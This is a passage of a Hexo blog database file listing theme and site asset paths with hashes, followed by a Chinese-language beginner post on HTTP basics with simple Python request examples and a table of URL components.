f47ce030df166c5e33d5de31fb","modified":1657605064575},{"_id":"themes/cactus/source/css/_partial/pagination.styl","hash":"950bf517bbe7adb9a9aa4eb5ddec74ffc7598787","modified":1657605064575},{"_id":"themes/cactus/source/css/_partial/search.styl","hash":"159be002780c62a77f46947cf854a7342fba24f4","modified":1657605064576},{"_id":"themes/cactus/source/css/_partial/tags.styl","hash":"d571d5c7c960300d29c5f0ec3fe1140322ecd6b3","modified":1657605064576},{"_id":"themes/cactus/source/css/_partial/tooltip.styl","hash":"2daff581ec3efaec840cbfdee512195919c32629","modified":1657605064576},{"_id":"themes/cactus/source/lib/clipboard/clipboard.min.js","hash":"6674f81dd01c76be986cf0a8172d1073e56d7ef4","modified":1657605064580},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.woff","hash":"f6fda2de0348b3e3b7de73267f9f8e97a62f8353","modified":1657605064611},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.woff2","hash":"7ea4fd7dd4cd4f480af78a0e2c5849eb921b1aeb","modified":1657605064611},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.woff","hash":"56e632c9196fac364c66f812a3b4635dd999ad1c","modified":1657605064614},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.woff2","hash":"6e40d0c7669c1adbcbf034bdc459f7bed4d6676d","modified":1657605064615},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.woff","hash":"1c3dbf17411b1f6a6b22c2b76e9d8511586643d0","modified":1657605064618},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.woff2","hash":"50b654d916204c30987d1987abd890ef92085ae3","modified":1657605064618},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.woff","hash":"43a8aaa3fca8721dd32a5d20f7a98dfbc87c97fd","modified":1657605064621},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.woff2","hash":"14b3e257c51a6a11d23b2a078017ff340c9777e4","modified":1657605064622},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Regular.woff","hash":"235889d59ddad2b1f3243ccaab7733bd713a2a21","modified":1657605064623},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Regular.woff2","hash":"a9714ffb842afc74836e64de04b52d8c37c87c8a","modified":1657605064623},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.woff","hash":"c0e784de2eb5261cca244928f8a81fd893c3fe16","modified":1657605064626},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.woff2","hash":"9b03b1a9071709f5b7dbca13412ecef6cb7a2a67","modified":1657605064626},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Variable.woff","hash":"2e8e6d38d361def5f48baac366f04e3db3ed4828","modified":1657605064629},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Variable.woff2","hash":"e213bb26bc7f10e1df3fe2d03d3ecaecd6e6d371","modified":1657605064629},{"_id":"themes/cactus/source/lib/vazir-font/font-face.css","hash":"ba0030e1cd28a8caa7a5bb74b98da7c7bb185c90","modified":1657605064629},{"_id":"themes/cactus/source/css/_partial/post/actions_desktop.styl","hash":"a1f36f9a3fd5ffcd832bf39e9402678978035d48","modified":1657605064576},{"_id":"themes/cactus/source/css/_partial/post/actions_mobile.styl","hash":"0d2966c1d870392476864af8ee3ba312ba30cb82","modified":1657605064576},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"be22b700cc80c242da898ef8b7bb96adc4e0899f","modified":1657605064583},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"d1a7eff18db8a47207ea42e34e9d9fbcc66a97a7","modified":1657605064583},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-v4compatibility.ttf","hash":"c77fcea87e0c4953f2b0ac92dc49a31c664b6ef7","modified":1657605064586},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-v4compatibility.woff2","hash":"60d794c18c2b58b2b76d2ce17b85c44c48fb2efd","modified":1657605064586},{"_id":"themes/cactus/source/lib/justified-gallery/css/justifiedGallery.min.css","hash":"dd3052149d3054f35efb823c68dd78e78aad5875","modified":1657605064588},{"_id":"themes/cactus/source/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"ad8f48b4022498078b089fcdd1e8b47faf496931","modified":1657605064588},{"_id":"themes/cactus/source/lib/jquery/jquery.min.js","hash":"b82d238d4e31fdf618bae8ac11a6c812c03dd0d4","modified":1657605064587},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.eot","hash":"91152bd73e7ff8d943e3bde3ddb0fa0a018e1c21","modified":1657605064610},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Black.ttf","hash":"b65915e3fa57b5c19995d15dc2341d115c1971b9","modified":1657605064611},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.eot","hash":"5c1c680fade45393e4a5bb4548a092cd5ea6811e","modified":1657605064613},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Bold.ttf","hash":"122bb778b17a152c426a825ee981610a4bd59bf3","modified":1657605064614},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.eot","hash":"a059359e9bea17dc2ff2ede955a05bf0dc4d00d0","modified":1657605064616},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Light.ttf","hash":"df82b80c4d3b11e70dcd269fc62ac97cbfa0414d","modified":1657605064617},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.eot","hash":"d9ec1f9f3fefd57e446cbe86dc297f1ff269b6de","modified":1657605064620},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Medium.ttf","hash":"948a091f0fdb8c7ae17d5ef8e51bd8830d65dd9a","modified":1657605064621},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Regular.eot","hash":"521c01f0eb79a48025e972ecbe21b0d7fb15437b","modified":1657605064622},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Regular.ttf","hash":"643c28c8f8a2bce1a0d62525aa045cd9883773cd","modified":1657605064622},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.eot","hash":"a0ea0bdaef00b35544f9a21d25d35db9a79f7189","modified":1657605064624},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Thin.ttf","hash":"6aacb0eecb03c660570b6e159ba5ca97ca7461cf","modified":1657605064625},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Variable.eot","hash":"af46f7f4e10a1440a4c97b350622d279143e6798","modified":1657605064627},{"_id":"themes/cactus/source/lib/vazir-font/Vazir-Variable.ttf","hash":"1e08b6373c2e086f24776df9b11e4be6bbcc8a4a","modified":1657605064628},{"_id":"themes/cactus/source/lib/font-awesome/css/all.min.css","hash":"d3cafed4c6596253c1050ee63897aa0f440e4f65","modified":1657605064581},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"98564e5517b7b455e80b2cd503e7bb3b52beb930","modified":1657605064582},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"cfb2c6122bd53141e939ee4ff991a16a29d1bdce","modified":1657605064582},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"09a731f80844483614ff12f86ccbe41db6736cb5","modified":1657605064586},{"_id":"themes/cactus/source/images/logo.png","hash":"0e3029251dfda26adee2761f71377297e8c26871","modified":1657605064579},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"b7d24ab1e4fad720f31a2b0cca1904ce1740d846","modified":1657605064596},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"9a23c6898b0943bd3d96c04df9a0f66e919451d8","modified":1657605064598},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"b542b9591fbf33925d93f0695b6e123a9f0cfd43","modified":1657605064602},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"926035f0156cccf1b0ca507347f39bf9c510f51e","modified":1657605064607},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"58be4b7760e9a84daa81929d046f9a15c4fd1c1a","modified":1657605064600},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"93ebc5098cf57a32b7b8d297681f31692c09bdfa","modified":1657605064603},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"9d757cc9f928fc83b2133283dd639c12b11d94ad","modified":1657605064607},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"34f7db59f1d023294e69976aa20b7d52b86165a4","modified":1657605064594},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"20ce1fc7ae1254558ca044ae48283faaa58897e5","modified":1657605064605},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"f9918fb93d6ab6850f5d38069a999c311af78816","modified":1657605064606},{"_id":"themes/cactus/source/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"97f5404656d9547666479ec64c336467000656ef","modified":1657605064586},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"6c090d6bff3928fbf8a5f4104e58ed7f421aea7c","modified":1657605064599},{"_id":"themes/cactus/source/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"de559f8d70d5b1ab2810597bfd0b1b9506f3ef01","modified":1657605064609},{"_id":"public/2023/05/02/SQL-INJECTION-FUNDAMENTALS/index.html","hash":"201d7446ef336ea65112a349acd24ac3d2ac1654","modified":1682998140133},{"_id":"public/2023/05/02/SQLMap/index.html","hash":"9a4909abacfe193352042cf17a406c17999bf694","modified":1682998140133},{"_id":"public/2023/04/09/HyperText-Transfer-Protocol-HTTP/index.html","hash":"588ab99f01c796512035f27ddda4545b6c1c1534","modified":1682998140133},{"_id":"public/2022/07/13/关于Ruby环境问题导致CocoaPods异常/index.html","hash":"2a4239ee3d907d938bf0e0af9796970b1a66fd3c","modified":1682998140133},{"_id":"public/archives/index.html","hash":"e576fa35d61d4e01ee50f235c545c6e56cc5ddd0","modified":1682998140133},{"_id":"public/archives/2022/index.html","hash":"a8bd6b6229486e3eef4426303e53bb7289084fef","modified":1682998140133},{"_id":"public/archives/2022/07/index.html","hash":"498cb5924e818692237bcbf8ccf048fea1d0ca38","modified":1682998140133},{"_id":"public/archives/2023/index.html","hash":"aa9079bb3dc5a469244b69e9767a5919431a4343","modified":1682998140133},{"_id":"public/archives/2023/04/index.html","hash":"dc8d3af6f2b5db820b9ede041611cf2cc79bc38c","modified":1682998140133},{"_id":"public/archives/2023/05/index.html","hash":"327db6744101ce44d593be12e3056775fc94a526","modified":1682998140133},{"_id":"public/index.html","hash":"08097bdddcb05dcefd02387426ffe4c1bc7389aa","modified":1682998140133},{"_id":"public/tags/BugBounty/index.html","hash":"9c38818267f4786d55965486a92c84677142e953","modified":1682998140133},{"_id":"public/tags/iOS/index.html","hash":"a592c1f7a86d886bb7db9f2ed9f27fac514a89ef","modified":1682998140133},{"_id":"public/tags/CocoaPods/index.html","hash":"97967d17fa98632838d3f7bdc7e4e2d3745b6677","modified":1682998140133},{"_id":"public/tags/渗透-BugBounty-安全-Cybersecurity/index.html","hash":"f2c01643fc5a180418378078459bb39db29244cc","modified":1682998140133},{"_id":"public/tags/Injection-Cybersecurit-数据库安全/index.html","hash":"f225daba644dd9978c6af87e8d6c96c89fe015f9","modified":1682998140133},{"_id":"public/images/apple-touch-icon.png","hash":"57e2def34682655f41a0be2d083f16765ba7858b","modified":1682998140133},{"_id":"public/images/favicon.ico","hash":"189f9842bcb79a6f8f9e8445bc8bbd773443826b","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Black.woff2","hash":"7ea4fd7dd4cd4f480af78a0e2c5849eb921b1aeb","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Black.woff","hash":"f6fda2de0348b3e3b7de73267f9f8e97a62f8353","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Bold.woff","hash":"56e632c9196fac364c66f812a3b4635dd999ad1c","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Bold.woff2","hash":"6e40d0c7669c1adbcbf034bdc459f7bed4d6676d","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Light.woff2","hash":"50b654d916204c30987d1987abd890ef92085ae3","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Light.woff","hash":"1c3dbf17411b1f6a6b22c2b76e9d8511586643d0","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Medium.woff2","hash":"14b3e257c51a6a11d23b2a078017ff340c9777e4","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Medium.woff","hash":"43a8aaa3fca8721dd32a5d20f7a98dfbc87c97fd","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Regular.woff2","hash":"a9714ffb842afc74836e64de04b52d8c37c87c8a","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Regular.woff","hash":"235889d59ddad2b1f3243ccaab7733bd713a2a21","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Thin.woff2","hash":"9b03b1a9071709f5b7dbca13412ecef6cb7a2a67","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Thin.woff","hash":"c0e784de2eb5261cca244928f8a81fd893c3fe16","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Variable.woff2","hash":"e213bb26bc7f10e1df3fe2d03d3ecaecd6e6d371","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Variable.woff","hash":"2e8e6d38d361def5f48baac366f04e3db3ed4828","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"be22b700cc80c242da898ef8b7bb96adc4e0899f","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"d1a7eff18db8a47207ea42e34e9d9fbcc66a97a7","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-v4compatibility.ttf","hash":"c77fcea87e0c4953f2b0ac92dc49a31c664b6ef7","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-v4compatibility.woff2","hash":"60d794c18c2b58b2b76d2ce17b85c44c48fb2efd","modified":1682998140133},{"_id":"public/images/favicon-192x192.png","hash":"96e6fcbbb13a5914a6131391e210eb7dfd13d692","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Black.ttf","hash":"b65915e3fa57b5c19995d15dc2341d115c1971b9","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Black.eot","hash":"91152bd73e7ff8d943e3bde3ddb0fa0a018e1c21","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Bold.eot","hash":"5c1c680fade45393e4a5bb4548a092cd5ea6811e","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Bold.ttf","hash":"122bb778b17a152c426a825ee981610a4bd59bf3","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Light.eot","hash":"a059359e9bea17dc2ff2ede955a05bf0dc4d00d0","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Light.ttf","hash":"df82b80c4d3b11e70dcd269fc62ac97cbfa0414d","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Medium.eot","hash":"d9ec1f9f3fefd57e446cbe86dc297f1ff269b6de","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Medium.ttf","hash":"948a091f0fdb8c7ae17d5ef8e51bd8830d65dd9a","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Regular.ttf","hash":"643c28c8f8a2bce1a0d62525aa045cd9883773cd","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Regular.eot","hash":"521c01f0eb79a48025e972ecbe21b0d7fb15437b","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Thin.eot","hash":"a0ea0bdaef00b35544f9a21d25d35db9a79f7189","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Thin.ttf","hash":"6aacb0eecb03c660570b6e159ba5ca97ca7461cf","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Variable.eot","hash":"af46f7f4e10a1440a4c97b350622d279143e6798","modified":1682998140133},{"_id":"public/lib/vazir-font/Vazir-Variable.ttf","hash":"1e08b6373c2e086f24776df9b11e4be6bbcc8a4a","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"98564e5517b7b455e80b2cd503e7bb3b52beb930","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"09a731f80844483614ff12f86ccbe41db6736cb5","modified":1682998140133},{"_id":"public/css/rtl.css","hash":"9589fac02a34fd9084f805f801889028756bbb65","modified":1682998140133},{"_id":"public/css/style.css","hash":"28e7d8d544ecbcf03e7ae85d9f80f1ff345a4334","modified":1682998140133},{"_id":"public/js/search.js","hash":"914a2ce72fb325106c61600200be823b72bfb39f","modified":1682998140133},{"_id":"public/lib/clipboard/clipboard.min.js","hash":"6674f81dd01c76be986cf0a8172d1073e56d7ef4","modified":1682998140133},{"_id":"public/js/main.js","hash":"619ac6529d140711e3b14f739a192bb31c4824ff","modified":1682998140133},{"_id":"public/lib/vazir-font/font-face.css","hash":"ba0030e1cd28a8caa7a5bb74b98da7c7bb185c90","modified":1682998140133},{"_id":"public/lib/justified-gallery/css/justifiedGallery.min.css","hash":"dd3052149d3054f35efb823c68dd78e78aad5875","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"cfb2c6122bd53141e939ee4ff991a16a29d1bdce","modified":1682998140133},{"_id":"public/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"ad8f48b4022498078b089fcdd1e8b47faf496931","modified":1682998140133},{"_id":"public/images/logo.png","hash":"0e3029251dfda26adee2761f71377297e8c26871","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"b542b9591fbf33925d93f0695b6e123a9f0cfd43","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"93ebc5098cf57a32b7b8d297681f31692c09bdfa","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"926035f0156cccf1b0ca507347f39bf9c510f51e","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"9d757cc9f928fc83b2133283dd639c12b11d94ad","modified":1682998140133},{"_id":"public/lib/jquery/jquery.min.js","hash":"b82d238d4e31fdf618bae8ac11a6c812c03dd0d4","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"9a23c6898b0943bd3d96c04df9a0f66e919451d8","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"58be4b7760e9a84daa81929d046f9a15c4fd1c1a","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"f9918fb93d6ab6850f5d38069a999c311af78816","modified":1682998140133},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"97f5404656d9547666479ec64c336467000656ef","modified":1682998140133},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"d3cafed4c6596253c1050ee63897aa0f440e4f65","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"b7d24ab1e4fad720f31a2b0cca1904ce1740d846","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"34f7db59f1d023294e69976aa20b7d52b86165a4","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"6c090d6bff3928fbf8a5f4104e58ed7f421aea7c","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"20ce1fc7ae1254558ca044ae48283faaa58897e5","modified":1682998140133},{"_id":"public/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"de559f8d70d5b1ab2810597bfd0b1b9506f3ef01","modified":1682998140133}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"HyperText Transfer Protocol (HTTP)","date":"2023-04-08T18:56:53.000Z","_content":"\nHyperText Transfer Protocol (HTTP) 是一种用于在Web上传输数据的协议。它是Web应用程序通信的基础，支持客户端与服务器之间的数据传输。在本课中，您将学习HTTP协议的基本概念和实现，以及如何使用Python库发出HTTP请求并分析响应。\n\n以下是一些课程中的关键概念和代码示例，以帮助您更好地理解HTTP协议和Python库的使用：\n\n### HTTP协议的主要特点：\n\n- 基于请求/响应模型。\n- 使用URI来指定资源。\n- 使用方法（例如GET，POST，PUT等）来定义操作类型。\n- 使用状态码来表示响应状态。\n- 可以使用标头来传输元数据。\n\n### Python库的使用：\n\nPython中有几个库可以用来发出HTTP请求并处理响应。以下是其中两个库的代码示例：\n\n#### 1. 使用Requests库发出HTTP请求：\n\n```python\nimport requests\n\nresponse = requests.get('https://www.example.com')\nprint(response.status_code)\nprint(response.content)\n```\n\n#### 2. 使用urllib库发出HTTP请求：\n\n```python\nimport urllib.request\n\nresponse = urllib.request.urlopen('https://www.example.com')\nprint(response.status)\nprint(response.read())\n```\n\n在Python中，您可以使用requests或urllib库发出HTTP请求，并使用响应对象的方法和属性来处理响应数据。\n\n### HTTP请求和响应的主要组成部分：\n\n- 请求：请求行，请求头，消息体。\n- 响应：状态行，响应头，消息体。\n\n![url_structure](https://p.ipic.vip/ds0c00.png)\n\n| **Component**  | **Example**          | **Description**                                              |\n| -------------- | -------------------- | ------------------------------------------------------------ |\n| `Scheme`       | `http://` `https://` | This is used to identify the protocol being accessed by the client, and ends with a colon and a double slash (`://`) |\n| `User Info`    | `admin:password@`    | This is an optional component that contains the credentials (separated by a colon `:`) used to authenticate to the host, and is separated from the host with an at sign (`@`) |\n| `Host`         | `inlanefreight.com`  | The host signifies the resource location. This can be a hostname or an IP address |\n| `Port`         | `:80`                | The `Port` is separated from the `Host` by a colon (`:`). If no port is specified, `http` schemes default to port `80` and `https` default to port `443` |\n| `Path`         | `/dashboard.php`     | This points to the resource being accessed, which can be a file or a folder. If there is no path specified, the server returns the default index (e.g. `index.html`). |\n| `Query String` | `?login=true`        | The query string starts with a question mark (`?`), and consists of a parameter (e.g. `login`) and a value (e.g. `true`). Multiple parameters can be separated by an ampersand (`&`). |\n| `Fragments`    | `#status`            | Fragments are processed by the browsers on the client-side to locate sections within the primary resource (e.g. a header or section on the page). |\n\n并非所有组件都需要用来访问资源。其中最主要的强制性字段是方案（scheme）和主机（host），没有这两个字段，请求将没有资源可供请求。\n\n","source":"_posts/HyperText-Transfer-Protocol-HTTP.md","raw":"---\ntitle: HyperText Transfer Protocol (HTTP)\ndate: 2023-04-09 02:56:53\ntags: BugBounty\n---\n\nHyperText Transfer Protocol (HTTP) 是一种用于在Web上传输数据的协议。它是Web应用程序通信的基础，支持客户端与服务器之间的数据传输。在本课中，您将学习HTTP协议的基本概念和实现，以及如何使用Python库发出HTTP请求并分析响应。\n\n以下是一些课程中的关键概念和代码示例，以帮助您更好地理解HTTP协议和Python库的使用：\n\n### HTTP协议的主要特点：\n\n- 基于请求/响应模型。\n- 使用URI来指定资源。\n- 使用方法（例如GET，POST，PUT等）来定义操作类型。\n- 使用状态码来表示响应状态。\n- 可以使用标头来传输元数据。\n\n### Python库的使用：\n\nPython中有几个库可以用来发出HTTP请求并处理响应。以下是其中两个库的代码示例：\n\n#### 1. 使用Requests库发出HTTP请求：\n\n```python\nimport requests\n\nresponse = requests.get('https://www.example.com')\nprint(response.status_code)\nprint(response.content)\n```\n\n#### 2. 使用urllib库发出HTTP请求：\n\n```python\nimport urllib.request\n\nresponse = urllib.request.urlopen('https://www.example.com')\nprint(response.status)\nprint(response.read())\n```\n\n在Python中，您可以使用requests或urllib库发出HTTP请求，并使用响应对象的方法和属性来处理响应数据。\n\n### HTTP请求和响应的主要组成部分：\n\n- 请求：请求行，请求头，消息体。\n- 响应：状态行，响应头，消息体。\n\n![url_structure](https://p.ipic.vip/ds0c00.png)\n\n| **Component**  | **Example**          | **Description**                                              |\n| -------------- | -------------------- | ------------------------------------------------------------ |\n| `Scheme`       | `http://` `https://` | This is used to identify the protocol being accessed by the client, and ends with a colon and a double slash (`://`) |\n| `User Info`    | `admin:password@`    | This is an optional component that contains the credentials (separated by a colon `:`) used to authenticate to the host, and is separated from the host with an at sign (`@`) |\n| `Host`         | `inlanefreight.com`  | The host signifies the resource location. This can be a hostname or an IP address |\n| `Port`         | `:80`                | The `Port` is separated from the `Host` by a colon (`:`). If no port is specified, `http` schemes default to port `80` and `https` default to port `443` |\n| `Path`         | `/dashboard.php`     | This points to the resource being accessed, which can be a file or a folder. If there is no path specified, the server returns the default index (e.g. `index.html`). |\n| `Query String` | `?login=true`        | The query string starts with a question mark (`?`), and consists of a parameter (e.g. `login`) and a value (e.g. `true`). Multiple parameters can be separated by an ampersand (`&`). |\n| `Fragments`    | `#status`            | Fragments are processed by the browsers on the client-side to locate sections within the primary resource (e.g. a header or section on the page). |\n\n并非所有组件都需要用来访问资源。其中最主要的强制性字段是方案（scheme）和主机（host），没有这两个字段，请求将没有资源可供请求。\n\n","slug":"HyperText-Transfer-Protocol-HTTP","published":1,"updated":"2023-05-01T22:15:38.357Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clh5pn0bk00007ex2brm8hzi9","content":"<p>HyperText Transfer Protocol (HTTP) 是一种用于在Web上传输数据的协议。它是Web应用程序通信的基础，支持客户端与服务器之间的数据传输。在本课中，您将学习HTTP协议的基本概念和实现，以及如何使用Python库发出HTTP请求并分析响应。</p>\n<p>以下是一些课程中的关键概念和代码示例，以帮助您更好地理解HTTP协议和Python库的使用：</p>\n<h3 id=\"HTTP协议的主要特点：\"><a href=\"#HTTP协议的主要特点：\" class=\"headerlink\" title=\"HTTP协议的主要特点：\"></a>HTTP协议的主要特点：</h3><ul>\n<li>基于请求&#x2F;响应模型。</li>\n<li>使用URI来指定资源。</li>\n<li>使用方法（例如GET，POST，PUT等）来定义操作类型。</li>\n<li>使用状态码来表示响应状态。</li>\n<li>可以使用标头来传输元数据。</li>\n</ul>\n<h3 id=\"Python库的使用：\"><a href=\"#Python库的使用：\" class=\"headerlink\" title=\"Python库的使用：\"></a>Python库的使用：</h3><p>Python中有几个库可以用来发出HTTP请求并处理响应。以下是其中两个库的代码示例：</p>\n<h4 id=\"1-使用Requests库发出HTTP请求：\"><a href=\"#1-使用Requests库发出HTTP请求：\" class=\"headerlink\" title=\"1. 使用Requests库发出HTTP请求：\"></a>1. 使用Requests库发出HTTP请求：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(<span class=\"string\">&#x27;https://www.example.com&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.status_code)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.content)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-使用urllib库发出HTTP请求：\"><a href=\"#2-使用urllib库发出HTTP请求：\" class=\"headerlink\" title=\"2. 使用urllib库发出HTTP请求：\"></a>2. 使用urllib库发出HTTP请求：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.request</span><br><span class=\"line\"></span><br><span class=\"line\">response = urllib.request.urlopen(<span class=\"string\">&#x27;https://www.example.com&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.status)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.read())</span><br></pre></td></tr></table></figure>\n\n<p>在Python中，您可以使用requests或urllib库发出HTTP请求，并使用响应对象的方法和属性来处理响应数据。</p>\n<h3 id=\"HTTP请求和响应的主要组成部分：\"><a href=\"#HTTP请求和响应的主要组成部分：\" class=\"headerlink\" title=\"HTTP请求和响应的主要组成部分：\"></a>HTTP请求和响应的主要组成部分：</h3><ul>\n<li>请求：请求行，请求头，消息体。</li>\n<li>响应：状态行，响应头，消息体。</li>\n</ul>\n<p><img src=\"https://p.ipic.vip/ds0c00.png\" alt=\"url_structure\"></p>\n<table>\n<thead>\n<tr>\n<th><strong>Component</strong></th>\n<th><strong>Example</strong></th>\n<th><strong>Description</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Scheme</code></td>\n<td><code>http://</code> <code>https://</code></td>\n<td>This is used to identify the protocol being accessed by the client, and ends with a colon and a double slash (<code>://</code>)</td>\n</tr>\n<tr>\n<td><code>User Info</code></td>\n<td><code>admin:password@</code></td>\n<td>This is an optional component that contains the credentials (separated by a colon <code>:</code>) used to authenticate to the host, and is separated from the host with an at sign (<code>@</code>)</td>\n</tr>\n<tr>\n<td><code>Host</code></td>\n<td><code>inlanefreight.com</code></td>\n<td>The host signifies the resource location. This can be a hostname or an IP address</td>\n</tr>\n<tr>\n<td><code>Port</code></td>\n<td><code>:80</code></td>\n<td>The <code>Port</code> is separated from the <code>Host</code> by a colon (<code>:</code>). If no port is specified, <code>http</code> schemes default to port <code>80</code> and <code>https</code> default to port <code>443</code></td>\n</tr>\n<tr>\n<td><code>Path</code></td>\n<td><code>/dashboard.php</code></td>\n<td>This points to the resource being accessed, which can be a file or a folder. If there is no path specified, the server returns the default index (e.g. 